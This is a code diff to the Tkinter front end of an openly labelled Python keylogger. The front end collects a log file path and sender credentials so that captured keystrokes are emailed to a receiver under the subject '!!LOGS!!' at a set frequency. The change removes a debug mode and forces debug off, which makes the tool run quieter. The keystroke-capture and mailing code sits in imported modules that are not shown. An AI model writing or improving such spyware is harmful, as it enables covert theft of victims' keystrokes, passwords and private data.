@@ -9,13 +9,12 @@ from paylaod import Monkey
 from sender import Pigeon
 
 class GUI:
-    def __init__(self, debug: bool = False) -> None:
+    def __init__(self) -> None:
         self.top = Tk()
         self.top.title("Keylogger")
         self.top.resizable(width=False, height=False)
 
         self.sender_mode = BooleanVar(self.top, False)
-        self.debug = BooleanVar(self.top, debug)
         self.filename = StringVar(self.top, "")
         self.subject = StringVar(self.top, "!!LOGS!!")
         self.body = StringVar(self.top, "default body text")
@@ -28,7 +27,6 @@ class GUI:
         self._update_widgets()
 
         # Track all variables for changes
-        self.debug.trace('w', self._update_widgets)
         self.sender_mode.trace('w',self._update_widgets)
         self.filename.trace('w',self._update_widgets)
         self.sender_email.trace('w',self._update_widgets)
@@ -41,10 +39,7 @@ class GUI:
         self.top.destroy()
 
         monkey_config = MonkeyConfig()
-        if self.debug.get():
-            monkey_config.filepath = "monkey_debug.log" if self.filename.get() == "" else self.filename.get()
-        else:
-            monkey_config.filepath = self.filename.get()
+        monkey_config.filepath = self.filename.get()
        
         pigeon_config = PigeonConfig()
         pigeon_config.filepath = monkey_config.filepath
@@ -53,12 +48,12 @@ class GUI:
         pigeon_config.password = self.password.get()
         pigeon_config.receiver_email = self.receiver_email.get()
         pigeon_config.body = self.body.get()
-        pigeon_config.debug = self.debug.get()
+        pigeon_config.debug = False
 
         app_config = AppConfig()
         app_config.email_frequency = self.email_frequency.get()
         app_config.sender_mode = self.sender_mode.get()
-        app_config.debug = self.debug.get()
+        app_config.debug = False
 
         App(config=app_config, 
             pigeon_config=pigeon_config, 
@@ -75,7 +70,6 @@ class GUI:
             self.filename.set(new_file)
 
     def _create_widgets(self):
-        Checkbutton(self.top, variable=self.debug, text="Debug Mode").grid(row=0, column=0, sticky=W, pady=5)
         keylogger_frame = LabelFrame(self.top, text="Keyloger Options", padx=5)
         
         Label(keylogger_frame,
@@ -156,9 +150,6 @@ class GUI:
             self.subject_entry.config(state=NORMAL)
             self.body_entry.config(state=NORMAL)
             self.email_frequency_entry.config(state=NORMAL)
-
-        if self.debug.get():
-            self.run_button.config(state=NORMAL)
 
 if __name__ == '__main__':
     GUI()
